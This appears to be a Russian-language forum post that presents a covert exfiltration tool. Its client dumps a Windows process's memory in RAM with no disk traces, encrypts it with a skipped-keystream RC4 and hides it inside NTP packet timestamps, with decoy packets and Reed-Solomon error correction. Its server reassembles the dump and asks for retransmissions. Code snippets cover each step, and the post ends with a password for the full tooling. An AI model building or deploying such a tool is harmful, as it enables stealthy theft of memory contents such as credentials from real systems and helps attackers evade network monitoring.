### Реализация скрытой эксфильтрации дампа памяти через NTP
Два основных компонента клиент и сервер. Клиентская часть отвечает за сбор дампа памяти процесса win, его сжатие, фрагментацию и шифрование, после чего отсылаются замаскированные пакеты, все операции выполняются полностью в оперативке, без следов на диске. Пакеты формируются так, что их внешний вид соответствует ntp трафику, чтобы увести подозрения при анализе. Серверная часть слушает заданный порт, принимает пакеты, извлекает полезную нагрузку, проводит расшифровку и декодирование для восстановления дампа. Рассмотрим работу каждого компонента по отдельности:  

## Начнём с клиента
### Формирование/упаковка/отправка payload и шифрование
На клиентской стороне исходные данные, полученные в результате дампа процесса(использует win api для перебора запущенных процессов и поиска pid процесса во время выполнения, дампится напрямую в оперативку с помощью DbgHelp), сначала сжимаются с помощью zlib и затем разбиваются на фрагменты фиксированного размера, по 2 байта полезной информации на фрагмент. Для каждого фрагмента вычисляется число, которое объединяет 16 бит номера фрагмента и 16 бит самих данных. Итого, получается 32 битное значение, которое дальше шифруется.

frag = val & 0xFFFF  # данные фрагмента
seq = val >> 16      # номер фрагмента
data_bytes = frag.to_bytes(2, 'big')
plain = ((seq & 0xFFFF) << 16) | int.from_bytes(data_bytes, 'big')
plain_bytes = [
    (plain >> 24) & 0xFF,
    (plain >> 16) & 0xFF,
    (plain >> 8)  & 0xFF,
    plain         & 0xFF
]

Для шифрования используется классическая схема rc4. Но! перед тем как сгенерировать основной поток, сначала делаем скип, то есть пропускаем некоторое количество байтов, вычисляемых как функция номера фрагмента (seq * 7) & 0xFF
Суть в том, что сначала генерируются лишние байты, чтобы сдвинуть состояние, а затем уже шифруется нужный блок, где в старших 16 битах номер, а в младших данные.

#### Формирование пака

Готовый зашифрованный блок пакуется в структуру ntp пакета, зашифрованные данные копируются в transmit timestamp пакета.

def CreateNTPPacket(payload):
    packet = bytearray(48)
    packet[0] = 0x1B  # LI=0, VN=3, Mode=3
    packet[40:48] = payload  # вставляем нагруз ВАЖНО с 40 по 47!
    return packet

Каждый пакет снабжается временным штампом, вычисленым на основе текущего времени с добавлением случайного шума:

unsigned int current_ntp = (unsigned int)(time(NULL) + 2208988800UL + (rand() % 20));
payload[0] = (current_ntp >> 24) & 0xFF;
payload[1] = (current_ntp >> 16) & 0xFF;
payload[2] = (current_ntp >> 8)  & 0xFF;
payload[3] = current_ntp & 0xFF;

После формирования пакета клиент отправляет его через udp сокет. Иногда вместо реальных фрагментов, клиент генерирует декой пакеты со случайными временными метками и данными.
Каждые block_size фрагментов объединяются в блок для вычисления фрагментов чётности с использованием rs кодирования. Для каждого блока генерируются равное число паритет фрагментов. Кодирование работает по полю gf 256.
На клиенте используются два массива для быстрого умножения элементов в поле. Вычисляется на базе полинома 0x11d:

void init_gf() {
    unsigned char x = 1;
    for (int i = 0; i < 255; i++) {
        gf_exp[i] = x; // Первый мас gf_exp 
        gf_log[x] = i; // Второй gf_log
        x <<= 1;
        if (x & 0x100)
            x ^= 0x11d;
    }
    for (int i = 255; i < 512; i++) {
        gf_exp[i] = gf_exp[i - 255];
    }
}

Умножение выполняется таким образом:

unsigned char gf_mul(unsigned char a, unsigned char b) {
    if (a == 0 || b == 0)
        return 0;
    int log_a = gf_log[a];
    int log_b = gf_log[b];
    int log_result = log_a + log_b;
    return gf_exp[log_result % 255];
}

Генерация паритетных символов для кодирования работает так, для каждого j от 0 до m1 вычисляем parity[j] = Σ data[i] * (alpha^(i*(j+1)))
по gf. Кодировка выглядит так:

void rs_encode_block(const unsigned char *data, int k, unsigned char *parity, int m) {
    for (int j = 0; j < m; j++) {
        parity[j] = 0;
        for (int i = 0; i < k; i++) {
            unsigned char coefficient = gf_exp[(i * (j + 1)) % 255];
            parity[j] ^= gf_mul(data[i], coefficient);
        }
    }
}

## Теперь про сервер

Сервер слушает заданный порт и ожидает получения пакетов. При поступлении пакета первая задача извлечь полезную нагрузку c 40 по 47 байт.

data, addr = sock.recvfrom(1024)
if len(data) >= 48:
    payload = data[40:48]  # дёргаем первые 8

Сервер в первых 8 байтах получает информацию об общем числе фрагментов и размере сжатого дампа эти данные потом используются для сборки полного дампа. 

Для расшифровки каждого пакета применяется такой же как на клиенте алгоритм шифрования со скипами. Он перебирает значения скип от 0 до 255, пытаясь расшифровать и сравнивая номер фрагмента с ожидаемым значением. Для обычных data паков номер должен быть меньше общего числа фрагментов, а для fec паков наоборот. Вот как определяем скипы: 

def deduce_skip(encrypted, key, total_fragments, is_fec=False):
    for skip in range(256):
        val, _ = try_decrypt(encrypted, key, skip)
        if not is_fec:
            if (val >> 16) < total_fragments:
                return skip, val
        else:
            if (val >> 16) >= total_fragments:
                return skip, val
    return None, None

Если скип определить удалось, сервер извлекает данные:
  
# Для обычного data пакa:
skip, val = deduce_skip(encrypted, RC4_KEY, total_fragments, is_fec=False)
if skip is not None:
    seq = val >> 16
    frag = val & 0xFFFF
    data_packets[seq] = frag.to_bytes(2, 'big')

Для fec пака аналогично определяется номер блока и индекс в блоке, после чего данные кладутся для последующего декодирования.

### Восстановление данных и декодирование
Если какие то фрагменты потерялись, сервер собирает данные по блокам и применяет декодирование для восстановления недостающих байтов. Для каждого блока на каждой из двух позиций формируется система на основе имеющихся данных и фрагментов. После того как декодирование восстанавливает недостающие фрагменты, сервер получает полную картину, распаковывает сжатый дамп и если всё в порядке, сохраняет его в файл. Если восстановление не удалось, сохраняется хотя бы сжатая версия. 


def rs_decode_block(block_data, fec_data, k_block):
    eq = build_equations(block_data, fec_data, k_block, pos=0)
    if len(eq) < k_block:
        raise ValueError("Pas assez d'équations pour résoudre RS")
    sol0 = rs_solve(eq[:k_block], k_block)
    
    eq = build_equations(block_data, fec_data, k_block, pos=1)
    sol1 = rs_solve(eq[:k_block], k_block)
    recovered = {}
    for i in range(k_block):
        if i not in block_data:
            recovered[i] = bytes([sol0[i], sol1[i]])
    return recovered

### Ретрансмиссии

Если после приёма не все фрагменты получены, сервер отправляет фидбэк через отдельный порт. В обратном сообщении передаётся количество недостающих фрагментов и их номера, чтобы клиент мог заново передать отсутствующие данные. Код для определения недостающих фрагментов выглядит следующим образом:

missing_fragments = [i for i in range(total_fragments) if i not in data_packets]
if missing_fragments and sender_addr:
    feedback = struct.pack(">I", len(missing_fragments))
    for seq in missing_fragments:
        feedback += struct.pack(">I", seq)
    # Отправка фидбэка через указанный порт

На стороне клиента реализован цикл повторных попыток с лимитом, в ходе которого недостающие фрагменты отправляются снова.

Полные коды клиент/сервер и скрипты автоматизации с подробными комментариями: 
pas: valde
